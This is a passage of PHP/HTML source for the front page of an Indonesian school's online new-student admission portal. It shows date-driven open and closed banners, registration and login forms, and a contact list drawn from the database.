<?php
require "config/database.php";
require "config/function.php";
require "config/functions.crud.php";
require "login/versi.php";
$buka  = new DateTime($setting['tgl_pengumuman']); //awal Buka
$tutup  = new DateTime($setting['tgl_tutup']); //awal Buka
$hariini = new DateTime(); // Waktu sekarang atau akhir
$diff  = $hariini->diff($buka);
$tgl_buka = $setting['tgl_pengumuman'];
$tgl_tutup = $setting['tgl_tutup'];
$tahun1 = date('Y');
$tahun2 = date('Y')+1;
?>

<?php if ($setting['ppdb'] == 1) { ?>
	

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8" />
    <meta content="width=device-width, initial-scale=1, shrink-to-fit=no" name="viewport" />
    <title>PPDB ONLINE &bull; <?= $setting['nama_sekolah'] ?></title>
    <!-- META DISKRIPSI-->
    <meta name="description" content="Mari Bergabung Bersama Kami di <?= $setting['nama_sekolah'] ?>, Pendaftaran Peserta didik Baru Tahun <?= date('Y') ?> Kembali Dibuka ">
    <meta name="keywords" content="PPDB Online,Pendaftaran Siswa Baru,"/>
    <meta name="msapplication-navbutton-color" content="#4285f4">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <meta name="msapplication-TileColor" content="#ffffff">		
    <meta name="theme-color" content="#ffffff">
    <link rel="stylesheet" href="assets/modules/izitoast/css/iziToast.min.css">
    <link href="assets/css/front.min.css" rel="stylesheet" />
    <link rel="shortcut icon" href="<?= $setting['logo'] ?>" >
    <link rel="stylesheet" href="assets/vendor/gloweffect.css">
    <link rel="stylesheet" href="assets/vendor/snakeborder.css">
    <link rel="stylesheet" href="assets/css/1.css">
    <link rel="stylesheet" href="assets/css/2.css">
    <link rel="stylesheet" href="assets/css/3.css">		
    <link rel="stylesheet" href="assets/css/components2.css">
    <link rel="stylesheet" href="css/dataTables.bootstrap4.min.css">
    <link rel="stylesheet" type="text/css" href="https://maxcdn.bootstrapcdn.com/font-awesome/4.7.0/css/font-awesome.min.css">
    <!--WAKTU JALAN-->
    <link rel="stylesheet" type="text/css" href="assets/vendor/animate/animate.css">
    <link rel="stylesheet" type="text/css" href="assets/vendor/countdowntime/flipclock.css">
    <link rel="stylesheet" type="text/css" href="assets/vendor/main.css">
    <!-- <link rel="stylesheet" type="text/css" href="assets/vendor/homepage-arunika.css"> -->
    <!-- Start GA -->
</head>
<!-- <script>
  var dt = "";
  var now = new Date();
  var dateNows = now.getFullYear() + '-' + (now.getMonth() + 1) + '-' + now.getDate() + ' 23:59:00';

  if (dt) {
    dt = "";
  } else {
    dt = `${dateNows}`;
  }

  var dateNow = now.toLocaleDateString('en-us', {timeZone: 'Asia/Jayapura'});
  dateNow = dateNow.split('/');
  var dateString = dateNow[2] + '/' + dateNow[0] + '/' + dateNow[1] + ' ' + dt.split(' ')[1];
  var countDownDate = new Date(dateString);
  countDownDate.setMinutes(countDownDate.getMinutes() + 1);
  
  var x = setInterval(function() {
    var now = new Date().getTime();
    var distance = countDownDate.getTime() - now; 
    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
    var seconds = Math.floor((distance % (1000 * 60)) / 1000);

    if (days <= 0)  {
      days = '00';
    } else if (days.length == 1) {
      days = `0${days}`
    }

    if (hours <= 0) {
      hours = '00';
    } else if (String(hours).length == 1) {
      hours = `0${hours}`
    }

    if (minutes <= 0) {
      minutes = '00';
    } else if (String(minutes).length == 1) {
      minutes = `0${minutes}`
    }

    if (seconds <= 0) {
      seconds = '00';
    } else if (String(seconds).length == 1) {
      seconds = `0${seconds}`
    }

    $('#days').html(days);
    $('#hours').html(hours);
    $('#minutes').html(minutes);
    $('#seconds').html(seconds);
    
    if (distance <= 0 || isNaN(distance)) {
      clearInterval(x);
      $('.as-counter').css("display", "none");
      $('.as-hero__button').css("margin-top", "0");
    }
  }, 1000);
</script> -->
<script>
    window.dataLayer = window.dataLayer || [];
    function gtag() {
        dataLayer.push(arguments);
    }
    gtag('js', new Date());
    gtag('config', 'UA-94034622-3');
</script>
<style>
.media {
 display:-ms-flexbox;
 display:flex;
 -ms-flex-align:start;
 align-items:flex-start
}
.media-body {
 -ms-flex:1;
 flex:1
}
.rounded-circle {
    border-radius: 50% !important;
}
.mr-3, .mx-3 {
    margin-right: 1rem !important;
}
.list-unstyled-border li {
    border-bottom: 2px solid #6c757d;
    padding-bottom: 15px;
    margin-bottom: 15px;
}
.text-job {
    font-size: 10px;
    text-transform: uppercase;
    letter-spacing: 1px;
    font-weight: 700;
}
.text-muted {
    color: #fe0412 !important;
}

</style>
<style type="text/css">
/* style untuk link popup */
a.popup-link {
padding:17px 0;
text-align: center;
margin:10% auto;
position: relative;
width: 300px;
color: #fff;
text-decoration: none;
background-color: #FFBA00;
border-radius: 3px;
box-shadow: 0 5px 0px 0px #eea900;
display: block;
}
a.popup-link:hover {
background-color: #ff9900;
box-shadow: 0 3px 0px 0px #eea900;
-webkit-transition:all 1s;
transition:all 1s;
}
/* end link popup*/
/* animasi popup */

@-webkit-keyframes autopopup {
from {opacity: 0;margin-top:-200px;}
to {opacity: 1;}
}
@-moz-keyframes autopopup {
from {opacity: 0;margin-top:-200px;}
to {opacity: 1;}
}
@keyframes autopopup {
from {opacity: 0;margin-top:-200px;}
to {opacity: 1;}
}
/* end animasi popup */
/*style untuk popup */  
#popup {
background-color: rgba(0,0,0,0.8);
position: fixed;
top:0;
left:0;
right:0;
bottom:0;
margin:0;
-webkit-animation:autopopup 2s;
-moz-animation:autopopup 2s;
animation:autopopup 2s;
}
#popup:target {
-webkit-transition:all 1s;
-moz-transition:all 1s;
transition:all 1s;
opacity: 0;
visibility: hidden;
}

@media (min-width: 768px){
.popup-container {
width:600px;
}
}
@media (max-width: 767px){
.popup-container {
width:100%;
}
}
.popup-container {
position: relative;
margin:7% auto;
/*padding:30px 50px;*/
background-color: transparent;
color:#000;
/*border: 3px solid #007d71;
box-shadow: 0px 0px 3px 3px #222d32;*/
border-radius: 20px;
}

a.popup-close {
position: absolute;
top:3px;
right:3px;        
padding:7px 10px;
font-size: 15px;
text-decoration: none;
line-height: 1;
color:#fff;
}
/* end style popup */

/* style untuk isi popup */
.popup-form {
margin:10px auto;
}
.popup-form h2 {
margin-bottom: 5px;
font-size: 37px;
text-transform: uppercase;
}
.popup-form .input-group {
margin:10px auto;
}
.popup-form .input-group input {
padding:17px;
text-align: center;
margin-bottom: 10px;
border-radius:3px;
font-size: 16px; 
display: block;
width: 100%;
}
.popup-form .input-group input:focus {
outline-color:#FB8833; 
}
.popup-form .input-group input[type="email"] {
border:0px;
position: relative;
}
.popup-form .input-group input[type="submit"] {
background-color: #FB8833;
color: #fff;
border: 0;
cursor: pointer;
}
.popup-form .input-group input[type="submit"]:focus {
box-shadow: inset 0 3px 7px 3px #ea7722;
}
/* end style isi popup */
</style>
    <body data-spy="scroll" data-target="#menu" data-offset="100">
        <div class="home-wrapper" id="home">
            <div class="home-header">
                <div class="container p-0">
                    <nav class="navbar navbar-expand-lg navbar-light" id="navbar-header">
                        <a class="navbar-brand" href="javascript:;">
                            <img src="<?= $setting['logo'] ?>" height="75" />
                            <div class="home-header-text d-none d-sm-block">
                                <h5>PENERIMAAN PESERTA DIDIK BARU</h5>
                                <h6><?= $setting['nama_sekolah'] ?></h6>
                                <h6>Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                            </div>
                            <span class="logo-mini-unbk d-block d-sm-none">PPDB</span>
                            <span class="logo-mini-tahun d-block d-sm-none">&nbsp;<span class=""style="color:#F00">&bull;</span>&nbsp;ONLINE</span>
                        </a>
                        <button class="navbar-toggler ml-auto" type="button" data-toggle="collapse" data-target="#menu" aria-controls="menu" aria-expanded="false" aria-label="Toggle navigation">
                            <span class="navbar-toggler-icon"></span>
                        </button>
                        <div class="collapse navbar-collapse" id="menu">
                            <ul class="navbar-nav ml-auto">
                                <li class="nav-item active">
                                    <a class="nav-link" href="#home" id="link-home">Home</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="#tentang" id="link-tentang">Daftar</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="#statistik" id="link-statistik">Statistik</a>
                                </li>
                                <li class="nav-item">
                                    <a class="nav-link" href="#persyaratan" id="link-persyaratan">Info Pendaftaran</a>
                                </li>
								<li class="nav-item">
                                    <a class="nav-link" href="datadaftar.php" id="link-persyaratan">Data Pendaftar</a>
                                </li>
                                <li class="nav-item">
                                    <a href="formulir.php" target="_blank" class="nav-link klikmenu"><span>Cetak Formulir</span></a>
                                </li>
								 <li class="nav-item">
                                    <a class="nav-link" href="./login" id="link-persyaratan">Admin</a>
                                </li>
                            </ul>
                        </div>
                    </nav>
                </div>
            </div>
            <?php if ($hariini <= $buka) { ?>
            <div class="home-banner">
                <div class="home-banner-bg home-banner-bg-color"></div>
                <div class="home-banner-bg home-banner-bg-img"></div>
                <div class="container mt-5">
                    <div class="row">
                        <div class="col-sm-6">
                            <div id="carousel" class="carousel slide" data-ride="carousel">
                                <ol class="carousel-indicators">
                                    <li data-target="#carousel" data-slide-to="0" class="active"></li>
                                    <li data-target="#carousel" data-slide-to="1"></li>
                                    <li data-target="#carousel" data-slide-to="2"></li>
                                </ol>
                                <div class="carousel-inner">
                                    <div class="carousel-item active">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Selamat Datang di Web PPDB Online
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Aplikasi Penerimaan Peserta Didik Baru Tahun Pelajaran <?= $setting['tahun_ajaran'] ?> <?= $setting['nama_sekolah'] ?> 
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                 Pendaftaran Siswa dan Siswi Baru Tahun <?= $setting['tahun_ajaran'] ?> Ini Belum Dibuka. Silahkan Menunggu Jadwal
                                                </li>
                                            </ul>
                                                <p data-animation="animated flipInX" data-delay="4s">
                                                <a href="#" class="btn btn-warning nav-link">
                                                    Pendaftaran Dibuka Pada Tanggal <?php echo tgl_indo("$tgl_buka");?></a></p>
                                        </div>
                                    </div>
                                    <div class="carousel-item">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Syarat Pendaftaran Peserta Didik Baru
                                            </h5>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Tahun Pelajaran <?= $setting['tahun_ajaran'] ?>
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Surat Keterangan Lulus
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Ijazah Jenjang Sebelumnya
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Kartu Keluarga
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Akta Kelahiran
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Scan Raport
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="carousel-item">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Alur Pendaftaran Peserta Didik Baru
                                            </h5>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Tahun Pelajaran <?= $setting['tahun_ajaran'] ?>
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Daftar Akun
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Lengkapi Formulir
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Upload Berkas
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Pembayaran (Jika Ada)
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Download Berkas
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                            <div class="col-sm-6">
                                <div class="container">
                                    <div class="col-sm-12 col-lg-12 animated bounceInLeft">
                                        <center><p data-animation="animated flipInX" data-delay="3s">
                                            <h4><a class="badge">
                                                <b>&bull; Formulir Pendaftaran Akan Terbuka Dalam &bull;</b><br><br><br><div class="cd100"></div>
                                            </a></h4></p></center>
                                        </div>
                                    </div>
                                </div>
                          </div>
                    </div>
                </div>
            </div>
            <?php } ?>
            <?php if ($hariini >= $buka) { ?>
                <div class="home-banner">
                <div class="home-banner-bg home-banner-bg-color"></div>
                <div class="home-banner-bg home-banner-bg-img"></div>
                <div class="container mt-5">
                    <div class="row">
                        <div class="col-sm-8">
                            <div id="carousel" class="carousel slide" data-ride="carousel">
                                <ol class="carousel-indicators">
                                    <li data-target="#carousel" data-slide-to="0" class="active"></li>
                                    <li data-target="#carousel" data-slide-to="1"></li>
                                    <li data-target="#carousel" data-slide-to="2"></li>
                                </ol>
                                <div class="carousel-inner">
                                    <?php if ($hariini >= $tutup) { ?>
                                    <div class="carousel-item active">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Selamat Datang di Web PPDB Online
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Aplikasi Penerimaan Peserta Didik Baru Tahun Pelajaran <?= $setting['tahun_ajaran'] ?> <?= $setting['nama_sekolah'] ?> 
                                                 </li>
                                                  <li data-animation="animated flipInX" data-delay="3s">
                                                 Pendaftaran Siswa dan Siswi Baru Tahun <?= $setting['tahun_ajaran'] ?> Ini Telah Ditutup... Silahkan Tunggu Gelombang Berikutnya
                                                </li>
                                            </ul>
                                                <p data-animation="animated flipInX" data-delay="4s">
                                                <a href="#" class="btn btn-danger nav-link">
                                                    Pendaftaran Sudah Ditutup Pada Tanggal <?php echo tgl_indo("$tgl_tutup");?>
                                                </a>
                                            </p>
                                        </div>
                                    </div>
                                    <?php } else { ?>
                                    <?php if ($hariini >= $buka ) { ?>
                                    <div class="carousel-item active">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Selamat Datang di Web PPDB Online
                                            </h5>
                                            <br>
                                                <p data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Aplikasi Penerimaan Peserta Didik Baru Tahun Pelajaran <?= $setting['tahun_ajaran'] ?> <?= $setting['nama_sekolah'] ?> 
                                                 </p>
                                                  <p data-animation="animated flipInX" data-delay="3s">
                                                 Pendaftaran Siswa dan Siswi Baru Tahun <?= $setting['tahun_ajaran'] ?> Ini Telah Dibuka. Silahkan Segera Daftar dan Lengkapi Formulir Anda
                                                </p>
                                                <p data-animation="animated flipInX" data-delay="4s">
                                                <a href="#persyaratan" class="btn btn-warning nav-link">Lihat Alur Pendaftaran</a>
                                                </p>
                                        </div>
                                    </div>
                                    <?php } ?>
                                    <?php } ?>
                                    <div class="carousel-item">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Syarat Pendaftaran Peserta Didik Baru
                                            </h5>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Tahun Pelajaran <?= $setting['tahun_ajaran'] ?>
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Surat Keterangan Lulus
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Ijazah Jenjang Sebelumnya
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Kartu Keluarga
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Akta Kelahiran
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Scan Raport
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                    <div class="carousel-item">
                                        <div>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Alur Pendaftaran Peserta Didik Baru
                                            </h5>
                                            <h5 data-animation="animated fadeInDownBig">
                                                Tahun Pelajaran <?= $setting['tahun_ajaran'] ?>
                                            </h5>
                                            <ul>
                                                <li data-animation="animated fadeInDownBig" data-delay="1s">
                                                    Daftar Akun
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="2s">
                                                    Lengkapi Formulir
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="3s">
                                                    Upload Berkas
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="4s">
                                                    Pembayaran (Jika Ada)
                                                </li>
                                                <li data-animation="animated flipInX" data-delay="5s">
                                                    Download Berkas
                                                </li>
                                            </ul>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                        <div class="col-sm-4">
                            <?php if ($hariini >= $tutup) { ?>
                            <p><a href="#" class="btn btn-danger animated infinite pulse delay-2s" style="color: #fff; border-radius: 30px;">
                            Pendaftaran Sudah Ditutup Pada Tanggal <?php echo tgl_indo("$tgl_tutup");?></a></p>
                            <?php } else { ?>
                            <div class="anim-border">
                                <div class="card card-login bg-info">
                                    <div class="card-body">
                                    <?php if ($hariini >= $buka ) { ?>
                                    <!-- <h1>
                                        <span>P</span>
                                        <span>e</span>
                                        <span>n</span>
                                        <span>d</span>
                                        <span>a</span>
                                        <span>t</span>
                                        <span>a</span>
                                        <span>r</span>
                                        <span>a</span>
                                        <span>n</span>
                                        <span>&ensp;</span>
                                        <span>A</span>
                                        <span>k</span>
                                        <span>a</span>
                                        <span>n</span>
                                        <span>&ensp;</span>
                                        <span>D</span>
                                        <span>i</span>
                                        <span>t</span>
                                        <span>u</span>
                                        <span>t</span>
                                        <span>u</span>
                                        <span>p</span>
                                        <span>&ensp;</span>
                                        <span>P</span>
                                        <span>a</span>
                                        <span>d</span>
                                        <span>a</span>
                                        <span>&ensp;</span>
                                        <span>T</span>
                                        <span>a</span>
                                        <span>n</span>
                                        <span>g</span>
                                        <span>g</span>
                                        <span>a</span>
                                        <span>l</span>
                                        <span>&ensp;</span>
                                        <span><?php echo tgl_indo("$tgl_tutup");?></span>
                                    </h1> --> 
                                    <center><div class="blink" style="font-size:11px; color: white"><b>Pendaftaran Akan Ditutup Pada Tanggal <?php echo tgl_indo("$tgl_tutup");?> </b></div></center>
                                    <img src="<?= $setting['logo_ppdb'] ?>" alt="" width="85%">
                                    <form id="form-login">
                                        <div class="form-group">
                                            <span class="fa fa-user"></span>
                                           <input type="text" onkeyup="this.value = this.value.toUpperCase()" class="form-control" name="username" placeholder="Masukkan NISN" required autocomplete="off">
                                        </div>
                                        <div class="form-group">
                                            <span class="fa fa-key"></span>
                                           <input type="password" class="form-control" name="password" id="inputPassword4" placeholder="Password">
                                        </div>
                                        <button type="submit" class="glow-on-hover" id="btnsimpan"><b>Masuk</b></button>
                                        <!-- <a href="" class="btn btn-primary btn-block btn-login"><b>Daftar Disini</b></a> -->
                                    </form>
                                    </div>
                                    <?php } ?>
                                    <?php } ?>
                                </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
            <?php } ?>
            <div class="home-content">
                <section id="tentang">
                    <div class="container">
                        <div class="row">
                            <div class="col-sm-8 d-flex align-items-center">
							<div class="col-mt-12 animated bounceInLeft">
                                <?php if ($hariini <= $buka) { ?>
                                <!-- <p><a href="#" class="btn btn-warning btn-block btn-login animated infinite pulse delay-2s" style="font-weight: bold">
                                Pendaftaran Dibuka Pada Tanggal <?php echo tgl_indo("$tgl_buka");?></a></p>
                                <div class="as-counter">
                                    <div class="as-counter__wrapper">
                                        <p id="days" class="as-counter__item">00</p>
                                        <p class="as-counter__time">Hari</p>
                                    </div>
                                    <div class="as-counter__colon"></div>
                                    <div class="as-counter__wrapper">
                                        <p id="hours" class="as-counter__item">00</p>
                                        <p class="as-counter__time">Jam</p>
                                    </div>
                                    <div class="as-counter__colon"></div>
                                    <div class="as-counter__wrapper">
                                        <p id="minutes" class="as-counter__item">00</p>
                                        <p class="as-counter__time">Menit</p>
                                    </div>
                                    <div class="as-counter__colon"></div>
                                    <div class="as-counter__wrapper">
                                        <p id="seconds" class="as-counter__item">00</p>
                                        <p class="as-counter__time">Detik</p>
                                    </div>
                                </div>
                                <div class="container">
                                    <div class="col-sm-12 col-lg-12 animated bounceInLeft">
                                        <div class="carousel-item active">
                                            <center><p data-animation="animated flipInX" data-delay="3s">
                                            <h4><a class="badge">
                                                <b>&bull; Formulir Pendaftaran Akan Terbuka Dalam &bull;</b><br><br><br><div class="cd100"></div>
                                            </a></h4></p></center>
                                        </div>
                                    </div>
                                </div> -->
                                <?php } ?>
                                <?php if ($hariini >= $tutup) { ?>
                                <!-- <p><a href="#" class="btn btn-danger btn-block btn-login animated infinite pulse delay-2s" style="font-weight: bold">
                                Pendaftaran Sudah Ditutup Pada Tanggal <?php echo tgl_indo("$tgl_tutup");?></a></p> -->
                                <?php } else { ?> 
                                <?php if ($hariini >= $buka ) { ?> 
                                <!-- <p><a href="#" class="btn btn-success btn-block btn-login animated infinite pulse delay-2s" style="font-weight: bold">
                                Pendaftaran Akan Ditutup Pada Tanggal <?php echo tgl_indo("$tgl_tutup");?></a></p> -->
								<?php if ($setting['jenjang'] == 1) { ?>
								<div class="card gradient-border">
									<div class="card-header bg-danger">
										<h4>Formulir Pendaftaran</h4>
									</div>
									<form method="post"id="form-daftar">
										<div class="card-body">
											<input type="date" name="tgl_daftar" class="form-control datepicker" value="<?= $daftar['tgl_daftar'] ?>"hidden >
											<div class="form-row">
                                            <div class="form-group col-md-6">
												<label for="asal">JURUSAN/PEMINATAN</label>
												<select class="form-control select2" style="width: 100%" name="jurusan" id="jurusan" >
													<option value="">Pilih Jurusan</option>
													<?php $qu = mysqli_query($koneksi, "select * from jurusan where status='1'");
													while ($jur = mysqli_fetch_array($qu)) {
													?>
														<option value="<?= $jur['nama_jurusan'] ?>"> <?= $jur['nama_jurusan'] ?></option>
													<?php } ?>
												</select>
                                            </div>
                                            <div class="form-group col-md-6">
                                                <label for="asal">JALUR PENDAFTARAN</label>
                                                <select class="form-control select2" style="width: 100%" name="jalur" id="jalur" >
                                                    <option value="">Pilih Jalur</option>
                                                    <?php $qu = mysqli_query($koneksi, "select * from jalur where status='1'");
                                                    while ($jal = mysqli_fetch_array($qu)) {
                                                    ?>
                                                        <option value="<?= $jal['nama_jalur'] ?>"> <?= $jal['nama_jalur'] ?></option>
                                                    <?php } ?>
                                                </select>
                                            </div>
                                            </div>
											<div class="form-row">
												<div class="form-group col-md-6">
													<label for="jenis">JENIS PENDAFTARAN</label>
													<select class="form-control" name="jenis" id="jenis">
													<option value="1">Siswa Baru</option>
												</select>
												</div>
												<input type="hidden" class="form-control datepicker" name="tgl_daftar" required>
												<div class="form-group col-md-6">
													<label for="nisn">NISN ANDA</label>
													<input type="number" maxlength="10" class="form-control" name="nisn" placeholder="NISN" autocomplete="off" required>
												</div>
											</div>
											<div class="form-row">
											<div class="form-group col-md-6">
												<label for="nama">NAMA LENGKAP*</label>
												<input type="text" class="form-control" name="nama_siswa" placeholder="Nama Lengkap" autocomplete="off" required>
											</div>
											<div class="form-group col-md-6">
												<label for="nohp">NO HANDPHONE</label>
												<input type="number" class="form-control" name="nohp" placeholder="No HP Whatsapp" required>
											</div>
											</div>
											<div class="form-row">
												<div class="form-group col-md-6">
													<label for="tempat">TEMPAT LAHIR</label>
													<input type="text" class="form-control" name="tempat" required>
												</div>
												<div class="form-group col-md-6">
													<label for="tgllahir">TANGGAL LAHIR</label>
													<input type="date" class="form-control" name="tgllahir" required>
												</div>
											</div>
                                            <div class="form-row">
                                                <div class="form-group col-md-12">
                                                    <label for="asal_sekolah">SEKOLAH/MADRASAH ASAL</label>
                                                    <input type="text" class="form-control" name="asal_sekolah"  required>
                                                </div>
                                            </div>
                                            <div class="form-row">
                                                <div class="form-group col-md-6">
                                                    <label for="nilai_rata">RATA-RATA NILAI AKHIR SEMESTER</label>
                                                    <input type="text" class="form-control" name="nilai_rata"  required>
                                                </div>
                                                <div class="form-group col-md-6">
                                                    <label for="inputPassword4" class="animated infinite pulse delay-2s text-merah"><span>PASSWORD (Mohon Diingat !!!)</span></label>
                                                    <input type="password" class="form-control" name="password" id="inputPassword4" placeholder="Password" required>
                                                </div>
                                            </div>
                                            <div class="form-row">
                                                <div class="form-group col-md-6">
                                                    <a href="#" onclick="document.getElementById('captcha').src = 'securimage/securimage_show.php?' + Math.random(); return false">Refresh Kode</a>
                                                    <img class="p-b-5" id="captcha" src="securimage/securimage_show.php" alt="CAPTCHA Image" style="height:70px" /><br>
                                                </div>
                                                <div class="form-group col-md-6">
                                                    <input class="form-control" type="text" name="kodepengaman" placeholder="Masukan Kode" required>
                                                </div>
                                            </div>
										</div>
										<div class="card-footer">
											<button id='btnsimpan' type="submit" name="submit" class="glow6-on-hover" style="border-radius: 15px; font-weight: bold"><i class="fa fa-user-plus mr-1"></i> Daftar Akun PPDB</button>
										</div>
									</form>
								</div>
								<?php } else { ?>
								<div class="card gradient-border">
									<div class="card-header bg-warning">
										<h4>Formulir Pendaftaran</h4>
									</div>
									<form id="form-daftar2">
										<div class="card-body">
											<input type="date" name="tgl_daftar" class="form-control datepicker" value="<?= $daftar['tgl_daftar'] ?>"hidden >
                                            <div class="form-row">
                                                <div class="form-group col-md-12">
                                                    <label for="nama">NAMA LENGKAP*</label>
                                                    <input type="text" class="form-control" name="nama_siswa" placeholder="Nama Lengkap" autocomplete="off" required>
                                                </div>
                                            </div>
											<div class="form-row">
												<div class="form-group col-md-6">
                                                    <label for="jenis">JENIS PENDAFTARAN</label>
                                                    <select class="form-control" name="jenis" id="jenis">
                                                        <option value="1">Siswa Baru</option>
                                                    </select>
                                                </div>
												<div class="form-group col-md-6">
                                                    <label for="asal">JALUR PENDAFTARAN</label>
                                                    <select class="form-control select2" style="width: 100%" name="jalur" id="jalur" >
                                                        <option value="">Pilih Jalur</option>
                                                        <?php $qu = mysqli_query($koneksi, "select * from jalur where status='1'");
                                                        while ($jal = mysqli_fetch_array($qu)) {
                                                            ?>
                                                            <option value="<?= $jal['nama_jalur'] ?>"> <?= $jal['nama_jalur'] ?></option>
                                                        <?php } ?>
                                                    </select>
                                                </div>
											</div>
											<div class="form-row">
                                             <div class="form-group col-md-6">
                                                <label for="nisn">NISN ANDA</label>
                                                <input type="number" maxlength="10" class="form-control" name="nisn" placeholder="NISN" autocomplete="off" required>
                                            </div>
											<div class="form-group col-md-6">
												<label for="nohp">NO HANDPHONE</label>
												<input type="number" class="form-control" name="nohp" placeholder="No HP Whatsapp" required>
											</div>
											</div>
											<div class="form-row">
												<div class="form-group col-md-6">
													<label for="tempat">TEMPAT LAHIR</label>
													<input type="text" class="form-control" name="tempat" required>
												</div>
												<div class="form-group col-md-6">
													<label for="tgllahir">TANGGAL LAHIR</label>
													<input type="date" class="form-control " name="tgllahir" required>
												</div>
											</div>
											<div class="form-row">
                                                <div class="form-group col-md-12">
                                                    <label for="asal_sekolah">SEKOLAH/MADRASAH ASAL</label>
                                                    <input type="text" class="form-control" name="asal_sekolah"  required>
                                                </div>
                                            </div>
											<div class="form-row">
                                                <div class="form-group col-md-6">
                                                    <label for="nilai_rata">RATA-RATA NILAI AKHIR SEMESTER</label>
                                                    <input type="text" class="form-control" name="nilai_rata"  required>
                                                </div>
                                                <div class="form-group col-md-6">
                                                    <label for="inputPassword4" class="animated infinite pulse delay-2s text-merah">PASSWORD (Mohon Diingat !!!)</label>
                                                    <input type="password" class="form-control" name="password" id="inputPassword4" placeholder="Password" required>
                                                </div>
											</div>
											<div class="form-row">
                                                <div class="form-group col-md-6">
                                                    <a href="#" onclick="document.getElementById('captcha').src = 'securimage/securimage_show.php?' + Math.random(); return false">Refresh Kode</a>
                                                    <img class="p-b-5" id="captcha" src="securimage/securimage_show.php" alt="CAPTCHA Image" style="height:70px" /><br>
                                                </div>
                                                <div class="form-group col-md-6">
                                                    <input class="form-control" type="text" name="kodepengaman" placeholder="Masukan Kode" required>
                                                </div>
                                            </div>
										</div>
										<div class="card-footer">
											<button id='btnsimpan' type="submit" class="glow6-on-hover" style="border-radius: 15px; font-weight: bold"><i class="fa fa-user-plus mr-1"></i> Daftar Akun PPDB</button>
										</div>
									</form>
								</div>
								<?php } ?>
                                <?php } ?>
                                <?php } ?>
							</div>
                        </div>
                        <!-- <div class="popup-wrapper" id="popup">
                            <div class="popup-container" style="width: 500px; height: 500px;">
                                <form action="" method="post" class="popup-form">
                                    <div class="embed-responsive embed-responsive-16by9">
                                        <img src="assets/img/logo/Logo_10.png" width="400">
                                    </div>
                                </form>
                                <a class="popup-close" href="#popup">X</a>
                            </div>
                        </div> -->
                        <div class="col-sm-4">
                            <div class="card mt-2 gradient-border">
                                <div class="card-header bg-secondary">Kontak Panitia</div>
                                    <div class="card-body">
                                        <div class="col-12 animated bounceIn">
                                            <div class="card-body">
                                                <ul class="list-unstyled user-details list-unstyled-border list-unstyled-noborder">
                                                    <?php $query = mysqli_query($koneksi, "select * from kontak where status='1'");
                                                        while ($kontak = mysqli_fetch_array($query)) {
                                                        ?>
                                                        <li class="media">
                                                            <img alt="image" class="mr-3 rounded-circle" width="40" src="<?= $kontak['foto_kontak'] ?>">
                                                            <div class="media-body">
                                                                <div class="media-title"><?= $kontak['nama_kontak'] ?></div>
                                                                <div class="text-job text-muted"><i class="fa fa-whatsapp text-success"></i><a href="https://api.whatsapp.com/send?phone=+62<?= $kontak['no_kontak'] ?>&text=<?= $setting['klikchat'] ?>"> <?= $kontak['no_kontak'] ?></a></div>
                                                            </div>
                                                        </li>
                                                    <?php } ?>
                                                </ul>
                                            </div>
                                        </div>
                                    </div>
                                </div>
                            </div>
                        </div>
                    </div>
                </section>
                <section id="statistik">
                    <div class="container">
                        <h5 class="text-center">Data Pendaftar </h5>
                        <h6 class="text-center">Peserta Didik Baru <?= $setting['nama_sekolah'] ?> Tahun Pelajaran <?= $setting['tahun_ajaran'] ?></h6>
                        <div class="row mt-12">
                            <div class="col-sm-4">
                                <div class="card mt-2 gradient-border">
